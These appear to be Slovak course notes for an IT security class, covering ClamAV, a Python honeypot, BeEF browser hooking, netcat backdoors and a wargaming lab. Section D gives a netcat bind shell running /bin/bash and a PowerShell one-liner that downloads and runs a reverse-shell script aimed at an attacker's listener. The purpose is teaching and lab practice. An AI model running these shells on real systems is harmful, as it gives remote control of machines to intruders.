
## A. ANTIVIRUSOVY PROGRAM NA ENDPOINT AJ SERVER

>[!warning] ## AK SI SERIF ZASTUPCU SI VYBERAJ OPATRNE !



Vzdy ked instalujes softver zvazuj aj hodnovernost jeho poskytovatela. Specialne pri AV davas pristup k svojim suborom na vyhladavanie a skumanie. 

ESET - SLOVACI
SOPHOS - Vyvojari v Linzi, Anglicka spolocnost s backgroundom v Cybersecurity
ClamAV - Open SOurce  CISCO - ZADARMO !!!

> [!info] SIGNATURE - Digitalny otlacok palca skodliveho virusu alebo malware. Hexadecimalny kod, ktory sa opakuje pri infikovanych pocitacoch.

DATABAZA VSETKYCH ZNAMYCH VIRUSOV A MALWARE S MOZNOSTOU SKUMANIA A VYHLADAVANIA
[VirusTotal - Home](https://www.virustotal.com/gui/home/search)


### A.1 Instalacia na Windows:

[ClamAVNet](https://www.clamav.net/)

Po nainštalovani inštalátorom sa umiestni do adresára:

``` powershell
C:\Program Files\ClamAV
```

### A.2 Konfigurácia na Windows

Prednastavené konfiguračné súbory pre freshclam.exe a clamd.exe sú a adresári

``` powershell
C:\Program Files\ClamAV\conf_examples
```

>[!warning]
>Nezabudni v konfiguračných súboroch odstrániť slovko EXAMPLE !!!


### A.3 Instalacia na Linux

``` bash
sudo apt-get update
sudo apt-get install clamav clamav-daemon
```

>[!info]
>Na Linuxe sú konfiguračné súbory funkčné ale nezabudni si ich skontrolovať.

### A.4 Časti CLAM AV

freshclam  - zabezpečuje update signatur   cca 8.7mil signatur

clamscan  - jednorazovy scan   

>[!warning ] ČO SKENOVAŤ !!! 
PRIORITA   - executables a nebezpecne formaty
VOLITELNÝ je zbytok súborov 

clamd  - demon s automatizaciou a množstvom nastavení ako a kedy

clamdtop - dashboard v konzole, ktorý ukazuje prácu antivírusu v reálnom čase

sigtool - pridavanie vlastnych signatur

A.5  UMELÁ INTELIGENCIA V SLUŽBÁCH IT SEC
Microsoft doslova pred pár dňami predstavil Microsoft SECURITY PILOT, umelú inteligenciu, ktorá sa bude starať o bezpečnosť Vašich sietí a počítačov.

## B. PASCE NA HACKEROV - HONEY POTY:

Naša doterajšia práca sa zameriavala na to aby sme čo najskôr zistili kybernetický útok na našej sieti.

<li>Máme všade SILNÉ HESLÁ</li>
<li>Máme na všetkých zariadeniach posledné UPDATY A PATCHE</li>
<li>Máme na každom počítači Antivírus</li>
<li>Máme na každom počítači individuálne nastavený Firewall</li>
<li>Na vstupe do každého segmentu máme Dynamický Firewall s DPI</li>
<li>Dôležité miesta v sieti nám stráži Suricata IDS</li>
<li>Máme zoskenované všetky zraniteľnosti každej subsiete</li>
<li>Všetky logy sa ukladajú zašifrovaných spojením na špeciálny server LOG MANAGEMENT</li>

Ako ešte môžeme zvýšiť ochranu našej siete ?

### B.1. BIELE ZOZNAMY - WHITELIST

Biele zoznamy sú nastavenia na sieťových zariadeniach, ktoré umožňujú komunikáciu iba zariadeniam, ktoré sú uvedené v týchto BIELYCH ZOZNAMOCH. Akonáhle sa do siete prihlási nové zariadenie nikto sa s ním nebude baviť.

>[!warning  ]
>HACKER: Počítače a zariadenia vo WHITELIST identifikujeme podľa IP, ktorá sa môže zmeniť alebo podľa MAC adresy. Túto však vieme tiež zmeniť pomocou Macchanger v KALI LINUXE. Router sa potom bude musieť rozhodovať medzi nami = trošku mu zamotáme hlavu.


### B.2 Medové hrnce - HONEPOTS A HONEYNETS

Umiestnením pasce na hackerov v určenom segmente, lákame Hackeov a Malware na návštevu. To čo sa zdalo pred chvíľou ako ľahká korisť, aktuálne zbiera dáta o útočníkovi a bije na poplach. Honeypoty sa navonok tvária ako zraniteľné počítače, ktoré majú otvorené porty, zraniteľný software alebo slabé heslo. V skutočnosti neobsahujú nič a ich úloha je indikovať kybernetický útok a informovať o tom svojho ŠERIFA.

#### B.2.1 JEDNODUCHÝ HONEYPOT V JAZYKU PYTHON3

``` python
import asyncio
import time

async def handle_connection(reader, writer):
	peername = writer.get_extra_info('peername')
	while True:  # nekonecny cyklus 
		data = await reader.read(1024)  # nacita byty
		if not data:
			break  # tak nic vrat sa do cyklu
		print(time.time(), peername, data.decode())   # zobraz na obrazovku
		writer.close()

async def main():
    server = await asyncio.start_server(handle_connection, '0.0.0.0', 23) # port 
    async with server:ls
    
        await server.serve_forever()  # server bez do nekonecna 

if __name__ == '__main__':
    asyncio.run(main())

```


CHAMELEON 
```bash
git clone https://github.com/qeeqbox/chameleon.git
cd chameleon
sudo chmod +x ./run.sh
sudo ./run.sh test
```

>[!info] HONEYPOTY
>Technickych rieseni pre implementaciu Honeypotov je mnozstvo. Od jednoduchych skriptov az po rozsiahle Honeynets kde prebieha ziva komunikacia medzi virtualnymi uzivatelmi.


## C. ZRANITELNOST WEB BROWSERA

Aj napriek všetkému zabezpečeniu si moderná doba vyžaduje aby na každom počítači bol Internetový prehliadač BROWSER. Tento BROWSER postupom času získal istú schopnosť, nielen komunikovať smerom k užívateľovi ale aj od užívateľa smerom k internetu. 

Získal kontrolu nad zaraideniami ako WEBKAMERY, MIKROFÓNY, uchováva HESLÁ, KOLÁČIKY, má priestor kde si vie ukladať údaje a súbory.

>[!warning  ]
>### NEPRIATEĽ POČÚVA  !!!


### C.1 DEMONŠTRÁCIA MOŽNOSTÍ FRAMEWORKU BEEF

Beef je exploitačný framework, ktorý sa tvári ako Web Server. Základom jeho fungovania je poskytovania falošnej stránky na ktorej beží skript hook.js

 ![BEEF Framework ](BEEF.png)

>[!info] 
>HACKER:  Pomocou hook.js vieme zahákovať browser podobne ako je to vo filmoch o pirátoch. Akonáhle je BROWSER zaháknutý môžeme ho pomocou príkazov ovládať a zbierať cenné informácie o užívateľovi.
> 





## D. Zadné vrátka alebo Reverzné shelly

### D.1 Zadné vrátka

Možností ako si nechať otvorené zadné vrátka je veľa, môžeme využiť programovacie jazyky alebo softvér. 

Obľúbenými vrátkami je nechať spustený softvér ako Teamviewer alebo iný spôsob vzdialeného prístupu v určitom čase. Občas stačí premenovť súbor a nechať ho bežať ako démona. 

#### D.1.1 ZADNÉ VRÁTKA POMOCOU NETCAT

Netcat je užitočná sieťová utilitka, ktorá nám umožňuje na jednej strane počúvať LISTENER čosi ako stetoskop a na druhej strane vysielať, čosi ako mikrofón. Počúvame samozrejme nie zvuk ale sieťovú prevádzku pomocou SOCKETOV spojenia IP adresy počítača a čísla PORTU.

Na jednom PC  pustíme LISTENER:
``` bash
sudo apt-get update
sudo apt-get install ncat

ncat -lk -p 6868   # počítač počúva na porte 6868 na svojej IP

```


Na druhej strane  sa napojíme na LISTENER a začneme mu posielať data v podobe súboru alebo textu.
``` bash
ncat IP_ADRESA PORT
```


>[!info] 
>SYSADMIN:  Okrem toho, že sme preverili, že oba počítač sa vedia spojiť vznikol ako vedľajší produkt improvizovaný CHAT. Komunikácia pomocou textu funguje OBOJSMERNE.
> 

>[!warning  ]
>### ITSEC: NETCAT POSIELA DÁTA NEŠIFROVANE  !!! Pokiaľ chceš použiť šifrovanie použi program Cryptocat


Netcat je často nainštalovaný na množstve počítačov a umožňuje skenovať sieť, vytvárať rôzne improvizované sieťové kanály, kontrolovať priehodnosť siete a pod. Má mnoho variácii a mien nc, ncat, netcat

>[! warning]
>HACKER: Najnebezpečnejšia funkcia NETCATU je  možnosť po pripojení vykonať nejaký príkaz v shelly. Napríklad   -e /bin/bash nám umožní ovládať Linuxový počítač cez terminál a zadávať mu príkazy.  Na windowse ho treba smerovať na cmd.exe alebo Powershell 
> 


Na PC kde chceme mať zadné vrátka:
``` bash
sudo apt-get update
sudo apt-get install ncat

ncat -lk -p 6868 -e /bin/bash  # počítač počúva na porte 6868 na svojej IP

```


Na druhej strane  
``` bash
ncat IP_ADRESA PORT
```


>[!info] 
>HACKER:  Tento prístup je však limitovaný a umožňuje iba jednoduché príkazy v shell


### D.2 REVERZNÝ SHELL NA WINDOWS

Väčšina sietí ma striktne nastavenú politiku čo može do siete sby sme ju ochránili od vonkajších hrozieb. Najväčšia bezpečnostná hrozba je však vo vnútri siete, nepreškolený alebo hlúpy užívateľ prípadne priveľmi sebavedomý SYSADMIN.

Pri REVERSE SHELL nás kontaktuje PC z chránenej LAN a ponúka nám prístup k svojmu príkazovému riadku. Stačí len nastaviť kde nás má kontaktovať a vždy keď sa ozve tak nás nakontaktuje sám. Prejde cez Firewall ako legitímna komunikácia z vnútra siete.

LISTENER NA STRANE ÚTOČNÍKA
``` bash
ncat -lvnp 6868 -s IP HOST
```


REVERSE SHELL POMOCOU SKRIPTU V POWERSHELL:

>[!warning  ]
>### NEPRIATEĽ POČÚVA  !!! Tento skript je NEBEZPEČNÝ A BOL STIAHNUTÝ Z GITHUBU !!! 

[antonioCoco · GitHub] (https://github.com/antonioCoco) a je voľne šírený pod MIT licenciou.
Autor je Analytik Malware a reverzný inžinier pre Windows.

``` powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IP HOST  6868
```

>[!info] 
>SYSADMIN:  V našom prípade všetko dopadlo dobre, škodlivý kód zachytil ANTIVIR a zabránil mu v poskytnutí údajov cieľovému serveru. Štandardne je tiež v ExecutionPolicy Windows, že nemá spúšťať žiadne ps1 skripty.





## E: WSL2 UBUNTU Terminal - LINUX NA DOSAH RUKY

V tejto fáze kurzu už by ste mali vedieť čosi o VM a kontajneroch. Windows postupne vychádza v ústrety ľuďom, ktorí spravujú a pracujú s Linuxovými serverami a otravuje ich CommandPrompt alebo Powershell. Linux bash je JEDNODUCHO SUPER.

S Microsoft STORE si môžete nainštalovať do svojeho systému WSL2 čo je v podstate hypervisor, ktorý Vám umožní nainštalovať si do WIN10 a vyššie oficálne Microsoftom podporovaný Linux rôznych farieb a príchutí. Áno aj KALI LINUX.

Je aj ľahšia forma a to UBUNTU Terminal, ktorý Vám cez štandardný Windows Terminal dovolí otvárať UBUNTU Shell. POZOR MÁ INÚ IP ADRESU AKO WINDOWS.



WSL2 Install Ubuntu Terminal
https://www.microsoft.com/store/productId/9P7BDVKVNXZ6

Ak zadáte tento adresár môžete používať celý File SYstem vašeho počítača
``` bash
cd /mnt/c/
```



## F. IT SEC CLUSTER A WARGAMING

### F.1 IT SEC ONLINE VZDELAVANIE

V rámci toho kurzu som Vám ukázal množstvo vecí, ktoré by ste mali teoreticky aj prakticky ovládať ak sa chcete venovať IT SEC. Problém je, že aj keď sme si nejaké veci ukazovali na mojej cvičnej sieti v tzv. HACKLABE či už na virtuálnych zariadeniach, alebo na skutočných, **praktické schopnosti získate iba sami**. Aby sme Vám túto cestu uľahčili vytvorili sme pre Vás sieť do ktorej sa budete pripájať a skúšať si rôzne ITSEC a hackerské nástroje cez Linux Shell.

Vnútorná sieť je oddelená od internetu a preto sa na ňu dá napojiť pomocou BRIDGU z internetu prostredníctvom SSH pripojenia.


### F.2 WARGAMING - HACKERSKE HRY

FORTIS AURIS o.z okrem vzdelávania a bezplatného poradenstva či osvety, vytvára VIRTUALNE BOJISKA A SCENARE PRE HACKEROV.  Medzi Hackermi sú obľúbené najmä:

<li>CTF získaj vlajku</li>
<li>DOMINATION obsaď najväčšiu časť CLUSTRA</li>
<li>HACKATHON spoločné riešenie problému</li>
<li>THREAT HUNT </li>
<li>ďalšie</li>


# http://188.121.170.77

``` bash & powershell
ssh itsec2023@188.121.170.77
```

Na vnútornom perimetri budú pre Vás pripravené počítače na ktorích  môžete využívať :

<li>ping traceroute ifconfig</li>
<li>skenovanie nmap</li>
<li>crackovanie hesiel pomocou hashov roznych uzivatelov</li>
<li>komunikovat s pripojenymi uzivatelmi pomocou wall, who, talk</li>
<li>pisanie pythonovskych skriptov v Python3</li>
<li>nastavovanie firewallov pomocou UFW a iptables</li>
<li>jednoduche socketservery a honeypoty</li>
<li>vytvarat jednoduche webservery a prezerat ich html stranky pomocou links2</li>


>[!info  ]
>### HESLO DO CLUSTRA VAM BUDE NA POZIADANIE ZASLANE V ZOOM CHATE.



